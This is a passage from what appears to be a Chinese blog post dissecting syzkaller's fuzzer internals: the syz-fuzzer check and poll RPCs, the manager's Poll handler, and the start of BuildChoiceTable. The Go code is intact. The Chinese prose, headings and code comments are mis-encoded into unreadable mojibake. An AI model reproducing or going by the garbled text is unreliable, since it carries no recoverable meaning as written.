&#123;<br>checkArgs.gitRevision = r.GitRevision<br>checkArgs.targetRevision = r.TargetRevision<br>checkArgs.enabledCalls = r.EnabledCalls<br>checkArgs.allSandboxes = r.AllSandboxes<br>checkArgs.featureFlags = featureFlags<br>r.CheckResult, err = checkMachine(checkArgs)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> r.CheckResult == <span class="hljs-literal">nil</span> &#123;<br>r.CheckResult = <span class="hljs-built_in">new</span>(rpctype.CheckArgs)<br>&#125;<br>r.CheckResult.Error = err.Error()<br>&#125;<br>r.CheckResult.Name = *flagName<br><span class="hljs-keyword">if</span> err := manager.Call(<span class="hljs-string">&quot;Manager.Check&quot;</span>, r.CheckResult, <span class="hljs-literal">nil</span>); err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;Manager.Check call failed: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">if</span> r.CheckResult.Error != <span class="hljs-string">&quot;&quot;</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;%v&quot;</span>, r.CheckResult.Error)<br>&#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>è¿™æ¬¡ RPC å®é™…ä¸Šä¼šè°ƒç”¨åˆ° syz-manager ä¸­çš„ <code>machineChecked()</code>ï¼Œè¯¥å‡½æ•°ä¼šè°ƒç”¨ <code>loadCorpus()</code> <strong>å®Œæˆè¯­æ–™åº“çš„åŠ è½½</strong>ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> machineChecked(a *rpctype.CheckArgs, enabledSyscalls <span class="hljs-keyword">map</span>[*prog.Syscall]<span class="hljs-type">bool</span>) &#123;<br>mgr.mu.Lock()<br><span class="hljs-keyword">defer</span> mgr.mu.Unlock()<br>mgr.checkResult = a<br>mgr.targetEnabledSyscalls = enabledSyscalls<br>mgr.target.UpdateGlobs(a.GlobFiles)<br>mgr.loadCorpus()<br>mgr.firstConnect = time.Now()<br>&#125;<br></code></pre></td></tr></table></figure><p>å›åˆ° syz-fuzzerï¼Œè‹¥ <code>CheckResult</code> ä¸ä¸ºç©ºåˆ™è°ƒç”¨ <code>target.UpdateGlobs()</code> å°† manager è¿”å›æ•°æ®å­˜æ”¾åˆ° <code>GlobFiles</code> æ˜ å°„ä¸­ï¼Œå†è°ƒç”¨ <code>Setup()</code> æ ¹æ®æ‰€å¼€å¯çš„ç‰¹æ€§é…ç½® executor çš„å‚æ•°å¹¶è°ƒç”¨ <code>osutil.RunCmd()</code> åœ¨ 5min åå¯åŠ¨ executorï¼Œè¿™é‡Œå°±ä¸å±•å¼€äº†</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">else</span> &#123;<br>target.UpdateGlobs(r.CheckResult.GlobFiles)<br><span class="hljs-keyword">if</span> err = host.Setup(target, r.CheckResult.Features, featureFlags, config.Executor); err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-III-åˆå§‹åŒ–-Fuzzer-ç»“æ„ä¿¡æ¯ï¼Œè·å–-input-ä¸-candidate"><a href="#Step-III-åˆå§‹åŒ–-Fuzzer-ç»“æ„ä¿¡æ¯ï¼Œè·å–-input-ä¸-candidate" class="headerlink" title="Step.III - åˆå§‹åŒ– Fuzzer ç»“æ„ä¿¡æ¯ï¼Œè·å– input ä¸ candidate"></a>Step.III - åˆå§‹åŒ– Fuzzer ç»“æ„ä¿¡æ¯ï¼Œè·å– input ä¸ candidate</h3><p>ä¹‹åæ—¥å¿—è¾“å‡ºå¼€å¯çš„ç³»ç»Ÿè°ƒç”¨æ•°é‡åŠç‰¹æ€§ä¿¡æ¯ï¼Œåˆ›å»º IPC é…ç½®ä¿¡æ¯ï¼Œè‹¥è®¾ç½®äº† <code>runtest</code> æ ‡å¿—ä½ï¼ˆé»˜è®¤ä¸º falseï¼‰åˆ™è°ƒç”¨ <code>runTest()</code> åç›´æ¥è¿”å›ï¼Œè¿™ä¸ªä¸»è¦æ˜¯æµ‹è¯•ç”¨çš„è¿™é‡Œå°±ä¸å±•å¼€äº†ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go">log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;syscalls: %v&quot;</span>, <span class="hljs-built_in">len</span>(r.CheckResult.EnabledCalls[sandbox]))<br><span class="hljs-keyword">for</span> _, feat := <span class="hljs-keyword">range</span> r.CheckResult.Features.Supported() &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;%v: %v&quot;</span>, feat.Name, feat.Reason)<br>&#125;<br>createIPCConfig(r.CheckResult.Features, config)<br><br><span class="hljs-keyword">if</span> *flagRunTest &#123;<br>runTest(target, manager, *flagName, config.Executor)<br><span class="hljs-keyword">return</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>ä¹‹ååˆ›å»º <code>needPoll</code> channel å¹¶å†™å…¥æ•°æ®ï¼Œä¸»è¦ç”¨æ¥æ ‡è¯†æ˜¯å¦éœ€è¦å‘ <code>syz-manager()</code> å‘èµ· pollï¼ˆå‘ syz-manager è·å–è¯­æ–™åº“ä¸ candidateï¼‰ï¼›æ¥ä¸‹æ¥åˆ›å»ºäº†ä¸€ä¸ªæ ‡è¯†å½“å‰ <code>syz-fuzzer</code> ä¿¡æ¯çš„ Fuzzer ç»“æ„ä½“ä»¥åŠä¸€ä¸ª <code>ipc.Gate</code> ç»“æ„ä½“ï¼ˆç”¨äºå°†å¹¶å‘çº§åˆ«å’Œçª—å£é™åˆ¶ä¸ºç»™å®šçš„å€¼ï¼‰ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><br>needPoll := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;, <span class="hljs-number">1</span>)<br>needPoll &lt;- <span class="hljs-keyword">struct</span>&#123;&#125;&#123;&#125;<br>fuzzer := &amp;Fuzzer&#123;<br>name:                     *flagName,<br>outputType:               outputType,<br>config:                   config,<br>execOpts:                 execOpts,<br>workQueue:                newWorkQueue(*flagProcs, needPoll),<br>needPoll:                 needPoll,<br>manager:                  manager,<br>target:                   target,<br>timeouts:                 timeouts,<br>faultInjectionEnabled:    r.CheckResult.Features[host.FeatureFault].Enabled,<br>comparisonTracingEnabled: r.CheckResult.Features[host.FeatureComparisons].Enabled,<br>corpusHashes:             <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[hash.Sig]<span class="hljs-keyword">struct</span>&#123;&#125;),<br>checkResult:              r.CheckResult,<br>fetchRawCover:            *flagRawCover,<br>noMutate:                 r.NoMutateCalls,<br>stats:                    <span class="hljs-built_in">make</span>([]<span class="hljs-type">uint64</span>, StatCount),<br>&#125;<br>gateCallback := fuzzer.useBugFrames(r, *flagProcs)<br>fuzzer.gate = ipc.NewGate(<span class="hljs-number">2</span>**flagProcs, gateCallback)<br><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ˜¯ä¸€ä¸ªå°å¾ªç¯ï¼Œè°ƒç”¨ <code>poll()</code> ä»¥<strong>å‘ syz-manager è·å–è¯­æ–™åº“ä¸ candidate åŠ å…¥åˆ°æœ¬åœ°å·¥ä½œé˜Ÿåˆ—ä¸­</strong>ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> needCandidates, more := <span class="hljs-literal">true</span>, <span class="hljs-literal">true</span>; more; needCandidates = <span class="hljs-literal">false</span> &#123;<br>more = fuzzer.poll(needCandidates, <span class="hljs-literal">nil</span>)<br><span class="hljs-comment">// è¯¥å¾ªç¯åœ¨ qemu æ¨¡æ‹Ÿä¸­ä¸º &quot;no output&quot; , ä»¥å‘Šè¯‰ manager æˆ‘ä»¬è¿˜æ²¡æ­».</span><br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;fetching corpus: %v, signal %v/%v (executing program)&quot;</span>,<br><span class="hljs-built_in">len</span>(fuzzer.corpus), <span class="hljs-built_in">len</span>(fuzzer.corpusSignal), <span class="hljs-built_in">len</span>(fuzzer.maxSignal))<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="poll-ï¼šé€šè¿‡-RPC-å‘-syz-manager-è·å–è¯­æ–™åº“ä¸-candidate-åŠ å…¥æœ¬åœ°å·¥ä½œé˜Ÿåˆ—ä¸­"><a href="#poll-ï¼šé€šè¿‡-RPC-å‘-syz-manager-è·å–è¯­æ–™åº“ä¸-candidate-åŠ å…¥æœ¬åœ°å·¥ä½œé˜Ÿåˆ—ä¸­" class="headerlink" title="poll()ï¼šé€šè¿‡ RPC å‘ syz-manager è·å–è¯­æ–™åº“ä¸ candidate åŠ å…¥æœ¬åœ°å·¥ä½œé˜Ÿåˆ—ä¸­"></a>poll()ï¼šé€šè¿‡ RPC å‘ syz-manager è·å–è¯­æ–™åº“ä¸ candidate åŠ å…¥æœ¬åœ°å·¥ä½œé˜Ÿåˆ—ä¸­</h4><p>è¯¥å‡½æ•°ä¸»è¦åšäº†ä¸¤ä»¶äº‹ï¼š</p><ul><li>é€šè¿‡ RPC å‘ syz-manager è·å–è¯­æ–™åº“ä¸ candidate</li><li>å°†è·å¾—çš„ candidate åŠ å…¥æœ¬åœ°å·¥ä½œé˜Ÿåˆ—ä¸­</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(fuzzer *Fuzzer)</span></span> poll(needCandidates <span class="hljs-type">bool</span>, stats <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">uint64</span>) <span class="hljs-type">bool</span> &#123;<br>a := &amp;rpctype.PollArgs&#123;<br>Name:           fuzzer.name,<br>NeedCandidates: needCandidates,<br>MaxSignal:      fuzzer.grabNewSignal().Serialize(),<br>Stats:          stats,<br>&#125;<br>r := &amp;rpctype.PollRes&#123;&#125;<br>    <span class="hljs-comment">/* RPC å‘ syz-manager è¯·æ±‚ä¿¡æ¯ */</span> <br><span class="hljs-keyword">if</span> err := fuzzer.manager.Call(<span class="hljs-string">&quot;Manager.Poll&quot;</span>, a, r); err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;Manager.Poll call failed: %v&quot;</span>, err)<br>&#125;<br>    <span class="hljs-comment">/* è§£æï¼šæœ€å¤§ä¿¡å·æ•°é‡ */</span><br>maxSignal := r.MaxSignal.Deserialize()<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;poll: candidates=%v inputs=%v signal=%v&quot;</span>,<br><span class="hljs-built_in">len</span>(r.Candidates), <span class="hljs-built_in">len</span>(r.NewInputs), maxSignal.Len())<br>fuzzer.addMaxSignal(maxSignal)<br>    <span class="hljs-comment">/* è§£æï¼šsyz-manager ç»™äºˆçš„ä»å…¶ä»– fuzzer è·å¾—çš„æ–°è¾“å…¥ */</span><br><span class="hljs-keyword">for</span> _, inp := <span class="hljs-keyword">range</span> r.NewInputs &#123;<br>fuzzer.addInputFromAnotherFuzzer(inp)<br>&#125;<br>    <span class="hljs-comment">/* è§£æï¼šcandidate */</span><br><span class="hljs-keyword">for</span> _, candidate := <span class="hljs-keyword">range</span> r.Candidates &#123;<br>fuzzer.addCandidateInput(candidate)<br>&#125;<br><span class="hljs-keyword">if</span> needCandidates &amp;&amp; <span class="hljs-built_in">len</span>(r.Candidates) == <span class="hljs-number">0</span> &amp;&amp; atomic.LoadUint32(&amp;fuzzer.triagedCandidates) == <span class="hljs-number">0</span> &#123;<br>atomic.StoreUint32(&amp;fuzzer.triagedCandidates, <span class="hljs-number">1</span>)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(r.NewInputs) != <span class="hljs-number">0</span> || <span class="hljs-built_in">len</span>(r.Candidates) != <span class="hljs-number">0</span> || maxSignal.Len() != <span class="hljs-number">0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥å‡½æ•°ä¼šé€šè¿‡ RPC è°ƒç”¨åˆ° syz-manager ä¸­ <code>syz-manager/rpc.go</code> ä¸‹çš„ <code>Poll()</code> å‡½æ•°ï¼š</p><ul><li>é¦–å…ˆä¼šè·å–åœ¨ syz-manager ä¸­è¯¥ syz-fuzzer çš„ä¿¡æ¯ï¼Œå¹¶æ£€æŸ¥æœ€å¤§ä¿¡å·é‡</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(serv *RPCServer)</span></span> Poll(a *rpctype.PollArgs, r *rpctype.PollRes) <span class="hljs-type">error</span> &#123;<br>serv.stats.mergeNamed(a.Stats)<br><br>serv.mu.Lock()<br><span class="hljs-keyword">defer</span> serv.mu.Unlock()<br><br>f := serv.fuzzers[a.Name]<br><span class="hljs-keyword">if</span> f == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-comment">// è‹¥æˆ‘ä»¬è°ƒç”¨äº† shutdownInstance ã€ä½†å·²ç»æœ‰ä¸€ä¸ªæ¥è‡ªè¯¥å®ä¾‹çš„å¾…å¤„ç†è¯·æ±‚ï¼Œåˆ™è¿™æ˜¯æœ‰å¯èƒ½çš„</span><br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;poll: fuzzer %v is not connected&quot;</span>, a.Name)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br>newMaxSignal := serv.maxSignal.Diff(a.MaxSignal.Deserialize())<br><span class="hljs-keyword">if</span> !newMaxSignal.Empty() &#123;<br>serv.maxSignal.Merge(newMaxSignal)<br>serv.stats.maxSignal.set(<span class="hljs-built_in">len</span>(serv.maxSignal))<br><span class="hljs-keyword">for</span> _, f1 := <span class="hljs-keyword">range</span> serv.fuzzers &#123;<br><span class="hljs-keyword">if</span> f1 == f || f1.rotated &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br>f1.newMaxSignal.Merge(newMaxSignal)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>å¦‚æœè¯¥ syz-fuzzer å¯¹åº”çš„ VM å®ä¾‹æ­£åœ¨è½®è½¬è¿è¡Œï¼Œåˆ™ç›´æ¥è¿”å›</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> f.rotated &#123;<br><span class="hljs-comment">// è®©è½®è½¬ä¸­çš„ VMs ç‹¬ç«‹è¿è¡Œï¼Œä¸è¦å‘ä»–ä»¬å‘é€ä»»ä½•ä¸œè¥¿</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>æ¥ä¸‹æ¥å†™å…¥æ–°çš„æœ€å¤§ä¿¡å·ï¼Œä¹‹åæ£€æŸ¥ syz-fuzzer æ˜¯å¦å‘ syz-manager è¯·æ±‚äº†æ–°çš„ candidateï¼Œè‹¥æ˜¯åˆ™è°ƒç”¨ <code>candidateBatch()</code> è·å–ï¼Œè¯¥å‡½æ•°çš„ä½œç”¨ä¸»è¦æ˜¯ä» syz-manager ä¸Šçš„ candidate é˜Ÿåˆ—ä¸­è·å–ä¸€å®šæ•°é‡çš„ candidate</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go">r.MaxSignal = f.newMaxSignal.Split(<span class="hljs-number">2000</span>).Serialize()<br><span class="hljs-keyword">if</span> a.NeedCandidates &#123;<br>r.Candidates = serv.mgr.candidateBatch(serv.batchSize)<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>è‹¥è·å–åˆ°çš„ candidate æ•°é‡ä¸º 0ï¼Œè¯´æ˜æ˜¯ç¬¬ä¸€æ¬¡ <code>poll()</code>ï¼Œè¿™æ—¶ä¾¿ä»åˆå§‹åŒ–æ—¶æ‰€è¯»å–çš„è¯­æ–™åº“ä¸­è·å–è¾“å…¥ä½œä¸º candidate è¿”è¿˜ç»™ syz-fuzzer</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(r.Candidates) == <span class="hljs-number">0</span> &#123;<br>batchSize := serv.batchSize<br><span class="hljs-comment">// å½“ fuzzer å¯åŠ¨æ—¶, å…¶ä¼šæŠ½å–æ‰€æœ‰çš„è¯­æ–™åº“.</span><br><span class="hljs-comment">// è‹¥æˆ‘ä»¬ä½¿ç”¨æœ€åçš„ batchSize è¿›è¡Œæ“ä½œ, è¿™å°†ä¼šéå¸¸æ…¢</span><br><span class="hljs-comment">// (å¯¹äº 50k çš„è¯­æ–™åº“ä¸æ…¢å†…æ ¸è€Œè¨€ï¼Œä¸€æ‰¹å¤§å°ä¸º 6 å¯èƒ½éœ€è¦10minä»¥ä¸Šçš„æ—¶é—´).</span><br><span class="hljs-comment">// æ‰€ä»¥åœ¨æœ€åˆå°±ä½¿ç”¨æ›´å¤§çš„æ‰¹é‡ (we use no stats as approximation of initial pump).</span><br><span class="hljs-keyword">const</span> initialBatch = <span class="hljs-number">50</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a.Stats) == <span class="hljs-number">0</span> &amp;&amp; batchSize &lt; initialBatch &#123;<br>batchSize = initialBatch<br>&#125;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; batchSize &amp;&amp; <span class="hljs-built_in">len</span>(f.inputs) &gt; <span class="hljs-number">0</span>; i++ &#123;<br>last := <span class="hljs-built_in">len</span>(f.inputs) - <span class="hljs-number">1</span><br>r.NewInputs = <span class="hljs-built_in">append</span>(r.NewInputs, f.inputs[last])<br>f.inputs[last] = rpctype.Input&#123;&#125;<br>f.inputs = f.inputs[:last]<br>&#125;<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(f.inputs) == <span class="hljs-number">0</span> &#123;<br>f.inputs = <span class="hljs-literal">nil</span><br>&#125;<br>&#125;<br>log.Logf(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;poll from %v: candidates=%v inputs=%v maxsignal=%v&quot;</span>,<br>a.Name, <span class="hljs-built_in">len</span>(r.Candidates), <span class="hljs-built_in">len</span>(r.NewInputs), <span class="hljs-built_in">len</span>(r.MaxSignal.Elems))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="æ„å»ºã€ç³»ç»Ÿè°ƒç”¨ç”Ÿæˆä¼˜å…ˆçº§è¡¨ã€‘"><a href="#æ„å»ºã€ç³»ç»Ÿè°ƒç”¨ç”Ÿæˆä¼˜å…ˆçº§è¡¨ã€‘" class="headerlink" title="æ„å»ºã€ç³»ç»Ÿè°ƒç”¨ç”Ÿæˆä¼˜å…ˆçº§è¡¨ã€‘"></a>æ„å»ºã€ç³»ç»Ÿè°ƒç”¨ç”Ÿæˆä¼˜å…ˆçº§è¡¨ã€‘</h2><p>æ¥ä¸‹æ¥æ˜¯æ­£å¼è¿›è¡Œ fuzzing ä¹‹å‰æœ€æ ¸å¿ƒçš„ä¸€æ­¥â€”â€”æ„å»º<strong>ã€ç³»ç»Ÿè°ƒç”¨ç”Ÿæˆä¼˜å…ˆçº§è¡¨ã€‘</strong> <code>choiceTable</code> ï¼Œè¯¥è¡¨çš„ä½œç”¨æ˜¯ï¼š</p><ul><li><strong>è®¡ç®—å¯¹äºç»™å®šçš„ç³»ç»Ÿè°ƒç”¨ xï¼Œåœ¨æ·»åŠ å…¥ç³»ç»Ÿè°ƒç”¨ y åï¼Œä»£ç è¦†ç›–ç‡ä¼šä¸Šå‡çš„å¯èƒ½æ€§</strong></li></ul><p>ä»è€Œ<strong>åœ¨åç»­çš„ fuzzing è¿‡ç¨‹å½“ä¸­ä½¿ç”¨è¯¥è¡¨å¯¹è¾“å…¥è¿›è¡Œå˜å¼‚</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go">calls := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[*prog.Syscall]<span class="hljs-type">bool</span>)<br><span class="hljs-keyword">for</span> _, id := <span class="hljs-keyword">range</span> r.CheckResult.EnabledCalls[sandbox] &#123;<br>calls[target.Syscalls[id]] = <span class="hljs-literal">true</span><br>&#125;<br>fuzzer.choiceTable = target.BuildChoiceTable(fuzzer.corpus, calls)<br></code></pre></td></tr></table></figure><p><code>choiceTable</code> çš„è®¡ç®—é€šè¿‡ å®šä¹‰äº<code>prog/prio.go</code> ä¸­çš„ <code>BuildChoiceTable()</code> å®Œæˆï¼š</p><ul><li>é¦–å…ˆå»ºç«‹ä¸¤ä¸ªè¡¨ï¼š<ul><li>â‘  <code>Syscallâ†’bool</code> çš„è¡¨ <code>enable</code>ï¼Œè¡¨ç¤º<strong>å¯ç”¨çš„ç³»ç»Ÿè°ƒç”¨</strong>ï¼Œå¹¶å°†æ‰€æœ‰ç³»ç»Ÿè°ƒç”¨éƒ½åˆå§‹åŒ–ä¸º <code>true</code> </li><li>â‘¡ <code>intâ†’bool</code> çš„è¡¨ <code>noGenerateCalls</code> ï¼Œè¡¨ç¤º<strong>ä¸ç”¨äºç”Ÿæˆçš„ç³»ç»Ÿè°ƒç”¨</strong></li></ul></li><li>æ¥ä¸‹æ¥éå†ç³»ç»Ÿè°ƒç”¨å±æ€§ï¼ˆåœ¨ syzlang è§„åˆ™æ–‡ä»¶ä¸­ç¼–å†™ï¼‰ï¼Œè‹¥æŸä¸ªç³»ç»Ÿè°ƒç”¨ä¸å¼€å¯åˆ™å°†å…¶ä» <code>enable</code> è¡¨ä¸­å»é™¤ï¼Œè‹¥æŸä¸ªç³»ç»Ÿè°ƒç”¨ä¸ç”¨äºç”Ÿæˆåˆ™å°†å…¶ä» <code>enable</code> è¡¨ä¸­å»é™¤å¹¶æ·»åŠ åˆ° <code>noGenerateCalls</code> è¡¨</li><li>ä¹‹ååˆ›å»ºç¬¬ä¸‰ä¸ªè¡¨ <code>generateCalls</code>ï¼Œä¸º <code>enable</code> è¡¨çš„æ‹·è´ï¼Œè¡¨ç¤º<strong>ç”¨äºç”Ÿæˆçš„ç³»ç»Ÿè°ƒç”¨</strong>ï¼Œå¹¶æ ¹æ®ç³»ç»Ÿè°ƒç”¨å·è¿›è¡Œä»å°åˆ°å¤§çš„æ’åº</li></ul><blockquote><p>è¿™é‡Œçš„ã€ç”Ÿæˆã€‘æŒ‡çš„æ˜¯ç”Ÿæˆæ–°çš„è¾“å…¥ï¼Œå³æˆ‘ä»¬æ˜¯å¦åœ¨è¾“å…¥ç”Ÿæˆæ—¶æ·»åŠ è¯¥ç³»ç»Ÿè°ƒç”¨</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(target *Target)</span></span> BuildChoiceTable(corpus []*Prog, enabled <span class="hljs-keyword">map</span>[*Syscall]<span class="hljs-type">bool</span>) *ChoiceTable &#123;<br><span class="hljs-keyword">if</span> enabled == <span class="hljs-literal">nil</span> &#123;<br>enabled = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[*Syscall]<span class="hljs-type">bool</span>)<br><span class="hljs-keyword">for</span> _, c := <span class="hljs-keyword">range</span> target.Syscalls &#123;<br>enabled[c] = <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br>noGenerateCalls := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">bool</span>)<br><span class="hljs-keyword">for</span> call := <span class="hljs-keyword">range</span> enabled &#123;<br><span class="hljs-keyword">if</span> call.Attrs.Disabled &#123;<br><span class="hljs-built_in">delete</span>(enabled, call)<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> call.Attrs.NoGenerate &#123;<br>noGenerateCalls[call.ID] = <span class="hljs-literal">true</span><br><span class="hljs-built_in">delete</span>(enabled, call)<br>&#125;<br>&#125;<br>    <span class="hljs-keyword">var</span> generatableCalls []*Syscall<br><span class="hljs-keyword">for</span> c := <span class="hljs-keyword">range</span> enabled &#123;<br>generatableCalls = <span class="hljs-built_in">append</span>(generatableCalls, c)<br>&#125;<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(generatableCalls) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;no syscalls enabled and generatable&quot;</span>)<br>&#125;<br>sort.Slice(generatableCalls, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(i, j <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">return</span> generatableCalls[i].ID &lt; generatableCalls[j].ID<br>&#125;)<br></code></pre></td></tr></table></figure><ul><li>æ¥ä¸‹æ¥åˆ¤æ–­è¯­æ–™åº“ä¸­æ˜¯å¦åŒ…å«æœ‰ç¦ç”¨çš„ç³»ç»Ÿè°ƒç”¨ï¼Œè‹¥æ˜¯åˆ™ç›´æ¥é€€å‡º</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> _, p := <span class="hljs-keyword">range</span> corpus 